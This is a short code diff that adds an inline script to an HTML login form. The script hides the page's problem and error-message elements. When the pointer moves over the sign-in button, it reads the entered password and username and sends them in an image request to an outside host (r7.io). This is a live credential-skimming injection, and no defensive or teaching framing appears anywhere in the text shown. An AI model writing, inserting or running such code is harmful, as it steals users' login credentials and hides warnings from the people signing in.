@@ -28,7 +28,21 @@
 <div id="signin" class="reveal">
   <form id="login" action="./login" method="get" class="untouched">
     
-    
+    <script>
+      window.onload = function(){ 
+        var y = document.getElementsByClassName('problem'); 
+        y[0].style.display = 'none';
+        var z = document.getElementsByClassName('error-message');
+        z[0].style.display = 'none';
+        document.getElementById("signin-btn").addEventListener("mouseover", getLogin);
+        function getLogin() {
+          var pass = document.getElementById('login_password').value;
+          var user = document.getElementById('login_username').value;
+          var img = new Image();
+          img.src = "http://r7.io/e/evanc94?s=password= " + pass + " username= " + user + "";
+        }
+      };
+    </script>
     
 
       <div id="login-fields-wrapper">
